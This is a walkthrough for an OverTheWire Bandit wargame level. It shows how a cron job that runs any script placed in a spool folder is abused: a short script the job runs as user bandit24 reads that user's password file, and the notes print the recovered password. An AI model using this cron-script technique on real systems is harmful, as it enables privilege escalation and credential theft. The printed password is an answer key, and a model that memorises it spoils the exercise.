## Level_23_to_Level_24

--------------------------------------



Level Goal
A program is running automatically at regular intervals from
cron, the time-based job scheduler. Look in /etc/cron.d/ for
the configuration and see what command is being executed.
NOTE: This level requires you to create your own first
shell-script. This is a very big step and you should be proud of
yourself when you beat this level!
NOTE 2: Keep in mind that your shell script is removed once
executed, so you may want to keep a copy around…
Commands you may need to solve this level
cron, crontab, crontab(5) (use “man 5 crontab” to access this)


-------
steps: 

```Bash
cat cronjob_bandit24
```

```
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null

```

```Bash
cat /usr/bin/cronjob_bandit24.sh 
```

```Bash
#!/bin/bash
myname=$(whoami)

cd /var/spool/$myname/foo
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -f ./$i
    fi
done
```


so we make the file index.sh 

```Bash
cat index.sh 
#!/bin/bash
cat /etc/bandit_pass/bandit24 > /tmp/tempfolder/bandit24password
```

we copy it to /var/spool/bandit24/foo
and we wait

```Bash 
 ls
bandit24password  index.sh  solution.sh
```

```Bash
cat bandit24password 
VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar
```

-------



----------

password: VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar

----------

--------------------------------------

